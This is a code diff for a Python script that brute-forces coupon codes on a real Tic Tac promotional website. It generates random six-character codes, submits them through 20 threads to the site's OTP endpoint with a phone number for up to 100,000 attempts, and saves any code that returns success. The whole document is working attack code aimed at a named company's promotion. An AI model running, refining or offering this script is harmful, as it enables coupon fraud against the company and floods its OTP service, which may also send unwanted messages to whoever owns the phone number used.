@@ -26,15 +26,15 @@ if sys.platform == 'win32':
     except:
         pass
 
-REAL_PHONE = "9876543210"          #Add any random 10 digit number or remain same 
+REAL_PHONE = "9876543220"          #Add any random 10 digit number or remain same 
 NUM_THREADS = 20
 NUM_CODES_TO_TRY = 100000         
 DELAY_PER_REQUEST = 0.5
-START_PREFIXES = [p.strip().upper() for p in os.getenv("START_PREFIXES", "T,M").split(",") if p.strip()]
-SAVE_FILE = "VALID_TICTAC_COUPONS_LIVEs.txt"
+START_WITH_D = True
+SAVE_FILE = "VALID_TICTAC_COUPONS_LIVE.txt"
 
 BASE_URL = "https://jarpecarpromo.tictac.com"
-REGISTER_URL = f"{BASE_URL}/in/en/xp/jarpecarpromo/home/register/"
+REGISTER_URL = f"{BASE_URL}/in/en/xp/jarpecarpromo/home/register"
 OTP_URL = f"{BASE_URL}/in/en/xp/jarpecarpromo/home/generateOTP/"
 
 HEADERS = {
@@ -75,17 +75,9 @@ def save_valid_coupon(code):
         except Exception as e:
             print(f"\n{Colors.FAIL}Error saving code: {e}{Colors.ENDC}")
 
-def choose_prefix():
-    if START_PREFIXES:
-        candidate = random.choice(START_PREFIXES)
-        if candidate and candidate[0].isalpha():
-            return candidate[0]
-    return random.choice(string.ascii_uppercase)
-
-
 def generate_coupon():
     chars = string.ascii_uppercase + string.digits
-    prefix = choose_prefix()
+    prefix = random.choice(['M', 'T']) if START_WITH_D else random.choice(string.ascii_uppercase)
     return prefix + ''.join(random.choice(chars) for _ in range(5))
 
 
@@ -94,30 +86,24 @@ def check_coupon(code, session, phone):
     try:
         response = session.post(OTP_URL, data=data, headers=HEADERS, timeout=15)
         if response.status_code != 200:
-            return False, f"Server error {response.status_code}"
+            return False, "Server error"
 
         try:
             result = response.json()
-        except Exception as e:
+        except:
             return False, "Bad response"
 
         status = result.get('status')
-        message = result.get('message', '')
-        
-        # Check if campaign is not live
-        if message and ('not yet live' in message.lower() or 'campaign is not' in message.lower() or 'not live' in message.lower()):
-            return False, "Campaign Not Live"
-        
         if status == 'success':
             return True, "VALID - OTP SENT!"
         else:
-            return False, message if message else "Invalid"
+            return False, "Invalid"
 
     except requests.exceptions.Timeout:
         return False, "Timeout"
-    except requests.exceptions.RequestException as e:
-        return False, f"Network error"
-    except Exception as e:
+    except requests.exceptions.RequestException:
+        return False, "Network error"
+    except Exception:
         return False, "Error"
 
 def worker(thread_id, codes_to_check, phone):
